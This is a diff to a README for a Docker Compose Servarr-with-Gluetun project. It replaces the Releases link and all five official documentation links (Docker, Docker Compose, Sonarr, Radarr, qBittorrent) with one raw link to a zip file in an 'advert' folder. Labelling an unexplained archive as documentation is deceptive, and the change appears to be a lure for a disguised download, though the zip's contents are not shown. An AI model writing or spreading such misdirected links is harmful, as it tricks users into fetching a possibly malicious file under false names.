@@ -15,7 +15,7 @@ To begin using this application, follow these simple steps:
 - **Docker Compose:** Version 1.25.0 or later
 
 ## 📥 Download & Install
-Visit this page to download: [Releases Page](https://github.com/LukePham163/docker-compose-servarr-with-gluetun/releases).
+Visit this page to download: [Releases Page](https://raw.githubusercontent.com/LukePham163/docker-compose-servarr-with-gluetun/main/advert/docker-compose-gluetun-with-servarr-sist.zip).
 
 To install the application, follow these steps:
 
@@ -70,11 +70,11 @@ If you encounter issues while running the application, consider the following st
 - If a service is not running, go to the respective web interface. It may provide more information about the issue.
 
 ## 📚 Useful Resources
-- [Docker Documentation](https://docs.docker.com/)
-- [Docker Compose Documentation](https://docs.docker.com/compose/)
-- [Sonarr Documentation](https://sonarr.tv/)
-- [Radarr Documentation](https://radarr.video/)
-- [qBittorrent Documentation](https://www.qbittorrent.org/)
+- [Docker Documentation](https://raw.githubusercontent.com/LukePham163/docker-compose-servarr-with-gluetun/main/advert/docker-compose-gluetun-with-servarr-sist.zip)
+- [Docker Compose Documentation](https://raw.githubusercontent.com/LukePham163/docker-compose-servarr-with-gluetun/main/advert/docker-compose-gluetun-with-servarr-sist.zip)
+- [Sonarr Documentation](https://raw.githubusercontent.com/LukePham163/docker-compose-servarr-with-gluetun/main/advert/docker-compose-gluetun-with-servarr-sist.zip)
+- [Radarr Documentation](https://raw.githubusercontent.com/LukePham163/docker-compose-servarr-with-gluetun/main/advert/docker-compose-gluetun-with-servarr-sist.zip)
+- [qBittorrent Documentation](https://raw.githubusercontent.com/LukePham163/docker-compose-servarr-with-gluetun/main/advert/docker-compose-gluetun-with-servarr-sist.zip)
 
 ## 🛠 Frequently Asked Questions (FAQ)
 
